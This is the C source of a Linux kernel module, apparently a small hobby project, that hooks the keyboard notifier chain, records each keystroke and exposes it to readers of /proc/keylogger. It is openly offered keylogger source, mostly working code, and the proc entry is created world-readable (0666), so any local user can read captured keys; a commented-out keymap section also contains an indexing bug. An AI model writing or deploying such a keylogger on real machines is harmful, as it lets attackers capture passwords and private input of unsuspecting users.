// keylogger_procfs.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>

#define PROCFS_NAME "keylogger"
#define MAX_BUFFER_SIZE 2

static struct notifier_block nb;
static char key_buffer[MAX_BUFFER_SIZE];
static struct proc_dir_entry *proc_file;
static spinlock_t lock;

static const char *keymap[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
    "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "ENTER", "CTRL", "A", "S", "D", "F", "G",
    "H", "J", "K", "L", ";", "'", "`", "LSHIFT", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "RSHIFT",
    "KPASTERISK", "LALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3",
    "KP0", "KPDOT"
    // Add other key names if necessary
};


static int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)data;

    if (action == KBD_KEYSYM && param->down) {
 	/*unsigned int keycode = param->value;
        if (keycode < ARRAY_SIZE(keymap)) {
            const char *key_name = keymap[keycode-10];
            spin_lock(&lock);
            snprintf(key_buffer, MAX_BUFFER_SIZE, "%s\n", key_name);
            spin_unlock(&lock);
        }*/
        char key = (char)param->value;
	//int key = (int)param->value;
       // if (key >= 32 && key <= 126) {
            spin_lock(&lock);
            key_buffer[0] = key;
            key_buffer[1] = '\0';
            spin_unlock(&lock);
       // }*/
    }

    return NOTIFY_OK;
}

static ssize_t procfile_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
    int len;
    spin_lock(&lock);
    len = strlen(key_buffer);
    if (*ppos > 0 || count < len) {
        spin_unlock(&lock);
        return 0;
    }
    if (copy_to_user(ubuf, key_buffer, len)) {
        spin_unlock(&lock);
        return -EFAULT;
    }
    *ppos = len;
    key_buffer[0] = '\0'; // Clear the buffer after reading
    spin_unlock(&lock);
    return len;
}

static const struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read = procfile_read,
};

static int __init keylogger_init(void) {
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    spin_lock_init(&lock);
    proc_file = proc_create(PROCFS_NAME, 0666, NULL, &proc_fops);
    if (!proc_file) {
        unregister_keyboard_notifier(&nb);
        printk(KERN_ALERT "Error creating /proc/%s\n", PROCFS_NAME);
        return -ENOMEM;
    }
    printk(KERN_INFO "/proc/%s created\n", PROCFS_NAME);
    return 0;
}

static void __exit keylogger_exit(void) {
    remove_proc_entry(PROCFS_NAME, NULL);
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "/proc/%s removed\n", PROCFS_NAME);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("aviv");
MODULE_DESCRIPTION("A simple keylogger module with procfs");
